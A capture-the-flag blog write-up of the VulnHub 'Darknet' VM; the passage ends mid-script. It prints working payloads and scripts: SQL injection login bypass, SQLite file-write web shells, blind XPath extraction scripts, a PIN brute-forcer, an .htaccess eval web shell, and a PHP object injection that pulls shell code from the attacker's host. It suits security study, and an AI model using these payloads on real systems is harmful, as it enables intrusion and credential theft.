<p>This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.</p>
<h2 id=getting-started>getting started<a hidden class=anchor aria-hidden=true href=#getting-started>#</a></h2>
<p>Starting with these VM&rsquo;s is almost always the same story and Darknet was no different. Pick up the VM&rsquo;s IP address (yes, I still use the VMWare network sniffer <code>sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer -e vmnet8</code>). <strong>192.168.252.140</strong>. On to the <code>nmap</code>!</p>
<pre tabindex=0><code>root@kali:~# nmap -v --reason 192.168.252.140 -sV

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-16 20:13 UTC

[...]

Reason: 998 resets
PORT    STATE SERVICE REASON         VERSION
80/tcp  open  http    syn-ack ttl 37 Apache httpd 2.2.22 ((Debian))
111/tcp open  rpcbind syn-ack ttl 37 2-4 (RPC #100000)
</code></pre><p>Just <code>tcp/80</code> to work with really. <code>tcp/111</code> did not yield anything interesting at first glance, but the most obvious next step was definitely the web port.</p>
<figure>
<img loading=lazy src=/images/darknet_homepage.png>
</figure>
<h2 id=888darknetcom>888.darknet.com<a hidden class=anchor aria-hidden=true href=#888darknetcom>#</a></h2>
<p>The homepage on the web server I have found so far was not very interesting. I scanned it with <code>gobuster</code> hoping to discover some more directories which revealed the existence of an <code>/access</code> folder.</p>
<pre tabindex=0><code>root@kali:~# gobuster -u http://192.168.252.140/ -w /usr/share/wordlists/wfuzz/general/common.txt

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.252.140/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/access (Status: 301)
/index (Status: 200)
=====================================================
</code></pre><p>Browsing to http://192.168.252.140/access/ showed that directory indexing was enabled and revealed the <code>888.darknet.com.backup</code> file.</p>
<figure>
<img loading=lazy src=/images/darknet_access_folder.png>
</figure>
<p>Downloading and inspecting the file, it quickly became apparent that this looked like an <a href=https://httpd.apache.org/docs/current/vhosts/examples.html>Apache Virtual Host</a> configuration.</p>
<pre tabindex=0><code>root@kali:~/data/VulnHub/Darknet# cat 888.darknet.com.backup
&lt;VirtualHost *:80&gt;
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
&lt;/VirtualHost&gt;
</code></pre><p>I took this as a hint that I would have to hack an entry into my local <code>/etc/hosts</code> to resolve <em>888.darknet.com</em> to <em>192.168.252.140</em>. After having done that, we are presented with yet another page with a login.</p>
<figure>
<img loading=lazy src=/images/darknet_888_login.png>
</figure>
<h2 id=888-authentication-bypass>888 authentication bypass<a hidden class=anchor aria-hidden=true href=#888-authentication-bypass>#</a></h2>
<p>Natural instinct has it that when you see login pages like these, you just throw some single quotes at the fields to see what happens. I did exactly this and was pleasantly met with an error response along the lines of <code>unrecognized token: "3590cb8af0bbb9e78c343b52b93773c9"</code>. This just <strong>screamed</strong> SQL injection! I figured since it seems to be reflecting errors back at the page, <code>sqlmap</code> might just quickly sort out this stage for us without much effort. <strong>Nope!</strong> After quite a bit of time, I learnt that the SQL injection only appears to be in the <code>username</code> field, but no matter how I tried to get <code>sqlmap</code> to play along, I was inevitably met with <code>[WARNING] POST parameter 'username' is not injectable</code> every time.</p>
<p>Admitting defeat, I figured I should stop being lazy and attempt the injection manually. The fact that the error message returned <code>unrecognized token</code> hinted towards the idea that the backend database might be SQLite. This gives me a frame of reference for the SQL dialect to use. Next, the most critical step for the injection to be successful was to try and envision what the query must look like in the backend. I played around quite a bit more, and got he most information out of the error message when I have the value <code>'"1</code> as a username and any text as a password.</p>
<figure>
<img loading=lazy src=/images/darknet_888_login_error.png>
</figure>
<p>Great. So with <code>""1' and pass='03c7c0ace395d80182db07ae2c30f034'"</code> as the error message, I theorized that the SQL query might be something along the lines of:</p>
<pre tabindex=0><code>SELECT * FROM users WHERE user='&lt;INJECT&gt;' and pass='&lt;MD5 OF PASS&gt;'
</code></pre><p>In the softwares logic then, there may be a requirement to just have a row return to mark the session as logged in. Makes sense right? :) So, in order to attempt an authentication bypass, I will need to try and get the query manipulated in such a way that the query will return a valid row regardless of the password. In SQL, we can have something like <code>SELECT 1</code> which will just return <code>1</code> in the row set.</p>
<pre tabindex=0><code>root@kali:~/data/VulnHub/Darknet# sqlite3
SQLite version 3.8.10.2 2015-05-20 18:17:19
Enter &quot;.help&quot; for usage hints.
Connected to a transient in-memory database.
Use &quot;.open FILENAME&quot; to reopen on a persistent database.
sqlite&gt; SELECT 1;
1
sqlite&gt;
</code></pre><p>With this knowledge, we can imagine that we could have the final query the software will execute look something like this:</p>
<pre tabindex=0><code>SELECT * FROM users WHERE user='a user' or '1' and pass='&lt;MD5 OF PASS&gt;'
</code></pre><p>In other words, if the injection point is in the <code>user</code> section, the payload we need to execute may be derived as follows:</p>
<p><code>SELECT * FROM users WHERE user='</code> <strong>a user' or &lsquo;1</strong> <code>' and pass='&lt;MD5 OF PASS>'</code></p>
<p>This obviously begs the requirement to have knowledge of a valid user! Well, remember that Apache Virtual host config file? It mentioned that the server admin is <code>devnull@darknet.com</code>. Admittedly, this took me a while to get to (and maybe a bit of a cheat :P), but using a username of <code>devnull</code> will complete the requirements we have to bypass the authentication needed for this page.</p>
<p>Considering the injection point and theorized query, we can use a username of <code>devnull' or 1'</code> and any password to login.</p>
<h2 id=administrator-sql-shell>administrator sql shell<a hidden class=anchor aria-hidden=true href=#administrator-sql-shell>#</a></h2>
<p>After the login bypass, I was presented with a page titled <strong>Administrador SQL</strong>.</p>
<figure>
<img loading=lazy src=/images/darknet_888_administrator_sql.png>
</figure>
<p>I tried a few queries but quickly realized that no output was returned no matter what you gave it.</p>
<p>While researching some of the possibilities with SQLite injection, I came across <a href=http://gwae.trollab.org/sqlite-injection.html>this</a> blogpost that details a method of writing arbitrary code to a file of our choosing (obviously assuming we have write access there). Considering I had a fictitious <em>SQL shell</em> now, I jumped right into trying this.</p>
<p>The first thing I needed to do though was to find a writable directory. The blogpost mentions that <code>uploads/</code> and <code>cache/</code> are usually good candidates (and rightfully so), but it did not seem like the paths existed at <a href=http://888.darknet.com/uploads/>http://888.darknet.com/uploads/</a> and <a href=http://888.darknet.com/cache/>http://888.darknet.com/cache/</a>. So I pulled up <code>gobuster</code> again to see if there are any other directories I could potentially use for this.</p>
<pre tabindex=0><code>root@kali:~/data/VulnHub/Darknet# gobuster -u http://888.darknet.com/ -w /usr/share/wordlists/wfuzz/general/common.txt

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://888.darknet.com/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/css (Status: 301)
/img (Status: 301)
/includes (Status: 301)
=====================================================
</code></pre><p>3 hits for <code>/css</code>, <code>/img</code> and <code>/includes</code>. Considering I had the VirtualHost configuration file, I also knew that these paths are most probably relative to the DocumentRoot at <code>/home/devnull/public_html</code>. Now, all I had to do was modify the payload as explained in the blogpost and cross my fingers. Without boring you with the nitty gritty details, I finally managed to figure out that I can write to the <code>/img</code> directory and gain some code execution.</p>
<pre tabindex=0><code>ATTACH DATABASE '/home/devnull/public_html/img/phpinfo.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ('&lt;?php phpinfo(); ?&gt;');
</code></pre><figure>
<img loading=lazy src=/images/darknet_888_phpinfo.png>
</figure>
<p>Yeah&mldr; look at that. The amount of <code>disable_functions</code> values explain why my initial <code>system()</code> type PHP shells were failing. Nonetheless, I was still able to browse the filesystem with a very rudementary script injected using the SQL shell I still had. The payload was as follows that allowed me to browse around and cat things.</p>
<pre tabindex=0><code>ATTACH DATABASE '/home/devnull/public_html/img/files.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES (&quot;&lt;?php if($_GET['a'] == 'ls') { print_r(scandir($_GET['p'])); } if($_GET['a'] == 'cat') { print_r(readfile($_GET['p'])); } ?&gt;&quot;);
</code></pre><p>Looking at the <code>phpinfo()</code> output, I also noticed the <code>open_basedir</code> value was set to <code>/etc/apache2:/home/devnull:/tmp</code>. This is kinda what motivated me to slap together that quick file browsing script so that I can see whats so interesting in <code>/etc/apache2</code> (especially since we already had this one vhost config requirement to get to this stage).</p>
<p>Lastly, I also learnt that we are currently the <code>devnull</code> user on a Debian Linux box&mldr; Weird. I expected something like <code>www-data</code> but ok.</p>
<figure>
<img loading=lazy src=/images/darknet_888_id.png>
</figure>
<p>Getting back to the <code>/etc/apache2</code> thing, I found another VirtualHost configuration file there in <code>/etc/apache2/sites-available/</code>. This was done using the <code>files.php</code> script I wrote and toggling the <code>a</code> parameter to <code>ls</code> or <code>cat</code> as needed. I was not able to find anything else interesting thanks to that epic <code>open_basedir</code> setting :/</p>
<figure>
<img loading=lazy src=/images/darknet_888_signal8.png>
</figure>
<h2 id=signal8-so-much-hate>signal8. so much hate.<a hidden class=anchor aria-hidden=true href=#signal8-so-much-hate>#</a></h2>
<p>I added another entry to my <code>/etc/hosts</code> and browsed to the new hostname discovered in that configuration file.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_home.png>
</figure>
<p>Poking around with the new website had a few points of interest but nothing that had any obvious bugs. The URL <a href="http://signal8.darknet.com/contact.php?id=1">http://signal8.darknet.com/contact.php?id=1</a> had something funny going on with the <code>id</code> field though I could not confirm if this was another SQL injection bug or not. A <code>robots.txt</code> also existed for this site and had the entry <code>Disallow: /xpanel/</code>. Browsing to this I was met with a login page.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel.png>
</figure>
<p>The login page too did not seem to have any obvious bugs. Some quick scans with <code>nikto</code>, <code>sqlmap</code> etc did not show me anything I did not already know.</p>
<p><em>fast forward many many hours</em></p>
<p>Eventually, I resorted to fuzzing all of the fields in the new site that I have found. I literally tested all of them, but again let me not bore you with the failed attempts ;) I will however detail the path that lead to success.</p>
<p>To fuzz all of the input fields, I fired up BurpSuite, captured the request to <a href="http://signal8.darknet.com/contact.php?id=1">http://signal8.darknet.com/contact.php?id=1</a> and sent it to Intruder.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_fuzzing.png>
</figure>
<p>Intruder was configured to use a simple fuzzing wordlist sourced from <code>/usr/share/wordlists/wfuzz/Injections/All_attack.txt</code> on Kali Linux from the <code>wordlists</code> package. Once the attack finished running, I went to the results and sorted them by response size. It was possible to quickly see in this case that those that returned an email address in the body and those that didn&rsquo;t based purely on the size. Using this list, I was able to filter out and realize that the payload of <code>count(/child::node())</code> managed to return a valid result for the <code>id</code> parameter.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpath_discovery.png>
</figure>
<p>The first time I saw this I had no idea how much time I would be spending on this particular bug. In fact, I have never come across this before so this was <strong>by far</strong> the most educational portion of the challenge for me!</p>
<h2 id=xpath-injection>xpath injection<a hidden class=anchor aria-hidden=true href=#xpath-injection>#</a></h2>
<p>Just googling the term <em>count(/child::node())</em> quickly revealed that this was something that related to XPath. XPath allows you to query XML datasets much like SQL can query databases. Ok great. Next up was a trip to owasp.org and their article on <a href=https://www.owasp.org/index.php/XPATH_Injection>XPATH Injection</a>. I spent quite a bit of time researching this type of vulnerability. I realized that the case I was dealing with here was blind XPath injection. Much like blind SQL injection, blind XPath injection can also be exploited by running &lsquo;queries&rsquo; that return true/false. The condition for true in this case was the fact that the email address appeared, and false was that it was missing from the response.</p>
<p>By far, <a href=http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf>this</a> PDF was the most useful in getting me to understand the vulnerability in the most depth.</p>
<p>Before I could exploit this bug though, I had to come up with a way to test the theories that I was reading about locally. To do this, I copied some XML that I found in one of the articles to start.</p>
<pre tabindex=0><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;Employees&gt;
   &lt;Employee ID=&quot;1&quot;&gt;
      &lt;FirstName&gt;Arnold&lt;/FirstName&gt;
      &lt;LastName&gt;Baker&lt;/LastName&gt;
      &lt;UserName&gt;ABaker&lt;/UserName&gt;
      &lt;Password&gt;SoSecret&lt;/Password&gt;
      &lt;Type&gt;Admin&lt;/Type&gt;
   &lt;/Employee&gt;
   &lt;Employee ID=&quot;2&quot;&gt;
      &lt;FirstName&gt;Peter&lt;/FirstName&gt;
      &lt;LastName&gt;Pan&lt;/LastName&gt;
      &lt;UserName&gt;PPan&lt;/UserName&gt;
      &lt;Password&gt;NotTelling&lt;/Password&gt;
      &lt;Type&gt;User&lt;/Type&gt;
   &lt;/Employee&gt;
&lt;/Employees&gt;
</code></pre><p>I then wrote a small PHP script that would allow me to test payloads as if it were injected into the XML on the site I have with the bug. This script looked as follows:</p>
<pre tabindex=0><code>&lt;?php

// Get the argument from the cli
$id = $argv[1];
$xpath = '//Employee[@ID=' . $id . ']/UserName';

// Be a little verbose about what the query will look like
print 'Injection    : ' . $id . PHP_EOL;
print 'Xpath        : ' . $xpath . PHP_EOL;
$xml = simplexml_load_file('test.xml');
print PHP_EOL;

// Run the XPath
$result = $xml-&gt;xpath($xpath);

// Return a result of the XPath was valid etc.
print 'Blind:' . PHP_EOL;
@print_r((string)$result[0]);

print PHP_EOL . PHP_EOL;

// Show the raw result of the XPath not filtered
print 'Raw:' . PHP_EOL;
print_r($result);
</code></pre><p>I studied some XPath functions available on <a href=http://devdocs.io/xslt_xpath-xpath-functions/>devdocs.io</a>. This reference together with what I read online as well as my small test scenario helped me figure that I could make use of the <a href=http://devdocs.io/xslt_xpath/xpath/functions/starts-with>starts-with()</a> XPath function to test for true/false scenarios. This proved to work in my little test environment.</p>
<pre tabindex=0><code>root@kali:~/data/VulnHub/Darknet# php readxml.php &quot;1 and starts-with(name(*[1]),'F')=1&quot;
Injection    : 1 and starts-with(name(*[1]),'F')=1
Xpath        : //Employee[@ID=1 and starts-with(name(*[1]),'F')=1]/UserName

Blind:
ABaker

Raw:
Array
(
    [0] =&gt; SimpleXMLElement Object
        (
            [0] =&gt; ABaker
        )

)
</code></pre><p>To test this scenario on Darknet, I took a guess at the node name of the field that is being returned as <code>email</code> considering its an email address that is being returned. It is possible to brute force these names as you will see later.
To start testing the feasibility of the blind boolean based injection, I entered the payload <code>1 and starts-with(email, 'e')</code> into the URL.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpath_booltest.png>
</figure>
<p>Boom. The email address is returned! This meant that I could run over a large key space and brute force other parts of the underlying XML, hoping to learn more of its structure. For clarities sake, the <code>starts-with()</code> function will later be expanded to be something like <code>1 and starts-with(email, 'errorlevel')</code>. Using the payload <code>2 and starts-with(email, 'd')</code> will also return the <code>devnull@darknet.com</code> email address as that email starts with <code>d</code> which makes the XPath query true.</p>
<p>I was not going to test all of these characters by hand, nope. I had to figure out what this XML looks like, so I wrote some scripts to help with that. The first script attempts to brute force the names of the current node as well as the parent node. If we have these names we can call them in an XPath query by name. For eg, <code>//parent/current/attribute</code>.</p>
<pre tabindex=0><code>import requests
import string
import sys

entry_point = 'http://signal8.darknet.com/contact.php'

payloads = {
    # . == current node and .. == parent node
    'CurrentNode': '1 and starts-with(name(.),&quot;{exfil}&quot;)=1',
    'ParentNode': '1 and starts-with(name(..),&quot;{exfil}&quot;)=1',
}


def w(t):
    sys.stdout.write(t)
    sys.stdout.flush()


for payload_type, payload in payloads.iteritems():

    w(&quot;\n{}: &quot;.format(payload_type))

    stop = False
    exfil = ''
    while not stop:

        stop = True

        for char in string.printable:
            r = requests.get(
                entry_point, params={
                    'id': payload.format(exfil=(exfil + char))
                })
            if 'darknet.com' in r.text:
                exfil += char
                w(char)
                stop = False

print &quot;\nDone&quot;
</code></pre><p>The script in action, determining that the XML has the structure <code>//auth/user</code>:</p>
<p>I was now able to theorize that the XML may have the following structure when calling user information. <code>//auth/user[@id=1]/email</code> where <code>1</code> is the ID of the user in question. I knew about the <code>email</code> field as it was <em>almost</em> obvious. I also discovered the <code>username</code> field by guessing. I tried to apply the same brute force logic as I did to the values, but for some reason I was not getting any luck with payloads where I was trying to address attributes by position, such as with <code>[*1]</code> for the first. This did work in my local test environment but not on Darknet. I had everything I needed to get the credentials for login (I think?), but did not have the passwords.</p>
<p>Eventually I wrote another script to take some words from a wordlist and brute the attribute names, hoping to discover some more attributes!</p>
<pre tabindex=0><code>import requests
import string
import sys

entry_point = 'http://signal8.darknet.com/contact.php'

payload = '1 and starts-with(name(//auth/user[id=1]/{word}),&quot;{word}&quot;)=1'
with open('/usr/share/wfuzz/wordlist/general/spanish.txt') as f:
    for word in f.readlines():
        word = word.strip()
        r = requests.get(entry_point, params={'id': payload.format(word=word)})
        if 'darknet.com' in r.text:
            print 'Found attribute: {word}'.format(word=word)

</code></pre><p>Having noticed a large part of the sites have been in Spanish, I eventually used a Spanish wordlist and found the field name <code>clave</code> with it. Urgh, that was mildly frustrating. Anyways, this script in action:</p>
<p>Finally. <code>username</code> & <code>clave</code>! As the final piece to this puzzle, I took the original script used to brute force the XML structure and modified the payloads to now brute the values for <code>username</code> and <code>clave</code>! The new payloads were:</p>
<pre tabindex=0><code>'username': '1 and starts-with((//auth/user[id=1]/username),&quot;{exfil}&quot;)=1',
'password': '1 and starts-with((//auth/user[id=1]/clave),&quot;{exfil}&quot;)=1',
</code></pre><p>The brute force script in action with the new payloads:</p>
<p>So the username and password combination that lets you login at <a href=http://signal8.darknet.com/xpanel/>http://signal8.darknet.com/xpanel/</a> is <code>errorlevel</code> / <code>tc65Igkq6DF</code>.</p>
<h1 id=the-ploy>the ploy<a hidden class=anchor aria-hidden=true href=#the-ploy>#</a></h1>
<p>Once you have logged in, you presented with a page with a login to <em>Editor PHP</em>.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_loggedin.png>
</figure>
<p>The link to <code>edit.php</code> had little value as it simply appeared to be a &lsquo;troll&rsquo; page. I guess the humor here is the fact that code/os command execution has been relatively painful and this may have been a sign of hope.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_troll_edit.png>
</figure>
<p>When I viewed the page sources for the page I got when I just logged it, I saw a hint to a <code>ploy.php</code> page.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_ploy.png>
</figure>
<p>Browsing to <code>ploy.php</code>, I was met with a file upload and a series of checkboxes to tick.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_ploy_upload.png>
</figure>
<p>It very quickly became obvious that you have to select the right combination of checkboxes in order to be allowed to upload anything. Each checkbox had a numeric value, so I copied this out into a script and proceeded to try all of the combinations possible. I knew a combination was correct if the Spanish term <em>Key incorrecta!</em> was not in the response. With some manual fiddling, I also learnt that the key was 4 integers long. Attempting a combination with more or less than 4 keys meant that the HTTP response had <em>La longitud de la clave no es la correcta!</em></p>
<pre tabindex=0><code>import requests
import itertools
import sys

VALUES = [37, 12, 59, 58, 72, 17, 22, 10, 99]
PIN = None

s = requests.Session()


def w(text):
    sys.stdout.write('\r' + text)
    sys.stdout.flush()


# Need a valid session before we can continue.
print('[+] Logging in')
s.post('http://signal8.darknet.com/xpanel/index.php', data={
    'username': 'errorlevel',
    'password': 'tc65Igkq6DF',
})

print('[+] Bruting PIN Code ...')
for c in itertools.permutations(VALUES, 4):
    w(&quot;{pin}&quot;.format(pin=', '.join(map(str, c))))
    r = s.post('http://signal8.darknet.com/xpanel/ploy.php',
               files={'imag': open('test_image.png', 'rb')},
               data={
                   'checkbox[]': c,
                   'Action': 'Upload',
               })

    if 'incorrecta' not in r.text:
        print('\n[+] Found pin: {pin}'.format(pin=', '.join(map(str, c))))
        break

</code></pre><p>Seeing this script in action would look as follows:</p>
<p>So the pin code was <code>37, 10, 59, 17</code>. Easy.</p>
<p>The next obvious step was to try and figure out how we can weaponize this file upload, if at all. The file upload appeared to accept most uploads except for those ending in .php. Uploading a PHP script would return the error <em>Formato invalido!</em> Things like images (or almost anything that was not useful) responded with <em>Subida exitosa!</em></p>
<p>I managed to discover a <code>uploads/</code> directory with <code>gobuster</code> again that helped me locate the uploaded files that I was uploading. The filenames appeared to remain intact which made things a little easier. But, this did not help me. I really hoped for some code execution.</p>
<p><em>fast forward even more hours</em></p>
<p>Eventually, I came across some PHP file upload bypass techniques that involve <code>.htaccess</code> files. The premise being that if its possible to write/overwrite a folders <code>.htaccess</code>, then it may be possible to <a href=http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html>add a tiny backdoor shell</a> to a folder. Sneaky! The only real requirement was that the VirtualHost configuration had to allow for <code>.htaccess</code> files to be read. As I had already downloaded the configuration file for signal8.darknet.com, I could quickly see that <code>AllowOverride</code> was set to <code>All</code>. Fantastic!</p>
<p>I picked a shell from the <a href=https://github.com/wireghoul/htshells>https://github.com/wireghoul/htshells</a> repository <a href=https://github.com/wireghoul/htshells/blob/master/shell/mod_php.shell.htaccess>here</a>. From my previous testing, I wrote a small uploader so that I wouldn&rsquo;t have to click those checkboxes all the time.</p>
<pre tabindex=0><code>import requests
import sys
import os.path as path

s = requests.Session()


def w(text):
    sys.stdout.write('\r' + text)
    sys.stdout.flush()


print('[+] Logging in ...')
s.post('http://signal8.darknet.com/xpanel/index.php', data={
    'username': 'errorlevel',
    'password': 'tc65Igkq6DF',
})

print('[+] Uploading : {file}'.format(file=sys.argv[1]))
r = s.post('http://signal8.darknet.com/xpanel/ploy.php',
           files={'imag': open(sys.argv[1], 'rb')},
           data={
               'checkbox[]': [37, 10, 59, 17],
               'Action': 'Upload',
           })

if 'Subida exitosa' in r.text:
    print('[+] Upload successful! Try: http://signal8.darknet'
          '.com/xpanel/uploads/{file}'.format(file=path.basename(sys.argv[1])))
elif 'Formato invalido' in r.text:
    print('[!] Upload failed. Invalid format.')
else:
    print('[!] Upload failed, unknown error.')
</code></pre><p>All I had to do was runt his script, providing the filename that I want to upload and viola.</p>
<pre tabindex=0><code>root@kali:~/data/VulnHub/Darknet# python bruteUploader.py .htaccess
[+] Logging in ...
[+] Uploading : .htaccess
[+] Upload successful! Try: http://signal8.darknet.com/xpanel/uploads/.htaccess
</code></pre><p>Once uploaded, I browsed to the location and was met with what looks like some code execution again!</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_shell.png>
</figure>
<p>As expected, the OS command execution does not work due to all those <code>disable_functions</code>, but we have PHP code execution so that was a start! I decided that for this one I wanted to try get a more fully featured shell working. So, I edited the <code>.htaccess</code> to include a web shell that <a href=https://gist.github.com/leonjza/8e9d16c84cf70014c4f36d8f95f9836e>I was working quite some time ago</a> (and finally kinda finished). I packed the shell and replaced the PHP in the <code>.htaccess</code> with the more fully featured shells packed source.</p>
<pre tabindex=0><code># &lt;!--  Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
&lt;Files ~ &quot;^\.ht&quot;&gt;
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
&lt;/Files&gt;

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### --&gt;&lt;?php eval(base64_decode(&quot;LONG BASE64 ENCODED STRING&quot;));
</code></pre><p>Uploaded this with my upload helper and boom, a better shell.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_shell2.png>
</figure>
<h2 id=the-last-hurdles>the last hurdle(s)<a hidden class=anchor aria-hidden=true href=#the-last-hurdles>#</a></h2>
<p>Wtf. The current user is <code>errorlevel</code>&mldr; I double checked and saw that previously we were the <code>devnull</code> user. This had me pretty confused in the beginning and had me spend quite a bit of time to figure out how this is possible. From the <code>phpinfo()</code> output we had no <code>open_basedir</code> restriction so that allowed me to move around the filesystem much more freely than before. I also noticed that I am not able to access the home directory for the <code>errorlevel</code> user so I couldn&rsquo;t really figure out what was going on in there (the red color indicates read/write is not possible).</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_homedirs.png>
</figure>
<p>Eventually, I discovered the use of <a href=http://www.suphp.org/>suPHP</a> as a loaded module. This basically means that the PHP script will run as the owner of the file. So with that theory, its sane to assume that because <code>errorlevel</code> owns the PHP files in the users home directory, that is why I am seen as that user too.</p>
<p>Anyways, some more enumeration later, I discover some more PHP scripts in <code>/var/www</code>. These were owned by <code>root</code>, meaning that if there are any vulnerabilities, I could effectively become root!</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_var_www.png>
</figure>
<p>Due to the fact that these were in <code>/var/www</code>, I could just browse to the IP address of the VM and run these scripts. Calling the <code>sec.php</code> script caused the server to return an HTTP 500 error.</p>
<figure>
<img loading=lazy src=/images/darknet_sec_error.png>
</figure>
<p>As I was able to read the files in <code>/var/www</code>, I also downloaded <code>sec.php</code> to get an idea of what its supposed to be doing.</p>
<pre tabindex=0><code>&lt;?php

require &quot;Classes/Test.php&quot;;
require &quot;Classes/Show.php&quot;;

if(!empty($_POST['test'])){
    $d=$_POST['test'];
    $j=unserialize($d);
    echo $j;
}
?&gt;
</code></pre><p>The call to <code>unserialize()</code> immediately hinted me towards what the next step would need to be. I continued to download the files that are required in the <code>Classes/</code> folder.</p>
<p>Test.php</p>
<pre tabindex=0><code>&lt;?php

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        $data=file_get_contents($this-&gt;url);
        $f=fopen($this-&gt;path.&quot;/&quot;.$this-&gt;name_file, &quot;w&quot;);
        fwrite($f, $data);
        fclose($f);
        chmod($this-&gt;path.&quot;/&quot;.$this-&gt;name_file, 0644);
}
}

?&gt;
</code></pre><p>Show.php</p>
<pre tabindex=0><code>&lt;?php

class Show {

    public $woot;

    function __toString(){
        return &quot;Showme&quot;;        

}
    function Pwnme(){
        $this-&gt;woot=&quot;ROOT&quot;;

}

}

?&gt;
</code></pre><p>A textbook example of <a href=https://www.owasp.org/index.php/PHP_Object_Injection>PHP Object Injection</a>! I continued to serialize an instance of of the <code>Show</code> class by copying the class into a new PHP file, instantiating the <code>Show</code> class and running the <code>serialize()</code> function over it, printing the output.</p>
<pre tabindex=0><code>// Source code for poishow.php
&lt;?php

class Show {

    public $woot;

    function __toString(){
        return &quot;Showme&quot;;

}
    function Pwnme(){
        $this-&gt;woot=&quot;ROOT&quot;;

}

}

print_r(serialize(new Show()));
</code></pre><p>Running this with a PHP interpreter printed the serialized string.</p>
<pre tabindex=0><code>root@kali:~/data/VulnHub/Darknet# php poishow.php
O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;N;}
</code></pre><p>I now had something I could use to try and test the vulnerability. For the <code>Show</code> class, we are going to leverage the <code>__toString()</code> method defined when <code>sec.php</code> calls <code>echo</code> on the variable containing the unserialized object. I write <em>yet another python helper</em> to send the serialized objects to the <code>sec.php</code> as a POST parameter. This was mostly because I was too lazy to deal with my shell and escaping the quotes etc. :)</p>
<pre tabindex=0><code>import requests

OBJECT = &quot;&quot;&quot;O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;N;}&quot;&quot;&quot;

print('[+] Exploiting the PHP Object Injection Bug')
r = requests.post('http://192.168.252.140/sec.php', data={'test': OBJECT})
print r.status_code
print r.text
</code></pre><p>Running this made the server still respond with an HTTP 500 error. Hmm. I was stuck here for quite some time trying to figure out if I can get some form of logging somewhere that I can read. At some stage, I came across <code>/etc/suphp</code> and realized that the configuration file for it is writable.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_suphp_writable.png>
</figure>
<p>The <code>suphp.conf</code> file had an entry <code>logfile=/var/log/suphp/suphp.log</code> which I changed to log to <code>/tmp</code>, hoping for it to reveal some information about the error code I was getting. To do this, I downloaded the file, modified the entry, and used my web shell&rsquo;s upload functionality to override the original configuration file. This worked just fine, apart from the fact that that logfile too was not readable by me :(</p>
<p>Some time later, I realized that there were two more configuration options in the configuration file that are of interest.</p>
<pre tabindex=0><code>; Minimum UID
min_uid=100

; Minimum GID
min_gid=100
</code></pre><p>Remember that the PHP scripts we are trying to access are owned by <code>root</code>? Turns out that this is a security feature of <a href=http://www.suphp.org/>suPHP</a> to prevent scripts with too high permissions to run. So, I modify the configuration file again to replace the values with <code>0</code> and upload it to override the original.</p>
<figure>
<img loading=lazy src=/images/darknet_signal8_xpanel_suphp_override.png>
</figure>
<p>This time, when I try and access the <code>sec.php</code> script, I am provided with no output. Great! Back to the original Object Injection that I was trying to exploit, I rerun my python script to test the <code>unserialize()</code>.</p>
<pre tabindex=0><code>root@kali:~/data/VulnHub/Darknet# python phpObjectInjection.py
[+] Exploiting the PHP Object Injection Bug
200
Showme
</code></pre><p>The <code>Showme</code> output is expected as the <code>__toString()</code> method is set to return this when the class should be represented as a string. Neat.</p>
<p>The next step was then to serialize an object with my desired values for the <code>Test</code> class&rsquo;s properties. Following the logic of the <code>__destruct()</code> method, it was clear to see that it would call a URL, write the contents to file and chmod the file accordingly. To do this, I added the <code>Test</code> class and set the values in my original script.</p>
<pre tabindex=0><code>&lt;?php

class Show {

    public $woot;

    function __toString(){
        return &quot;Showme&quot;;

}
    function Pwnme(){
        $this-&gt;woot=&quot;ROOT&quot;;

}

}

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        # Commented out as this will run when this script
        # also finishes :D

        #$data=file_get_contents($this-&gt;url);
        #$f=fopen($this-&gt;path.&quot;/&quot;.$this-&gt;name_file, &quot;w&quot;);
        #fwrite($f, $data);
        #fclose($f);
        #chmod($this-&gt;path.&quot;/&quot;.$this-&gt;name_file, 0644);
}
}


$test = new Test();
$test-&gt;url = 'http://192.168.252.1:8000/shell.txt';
$test-&gt;name_file = 'pop.php';
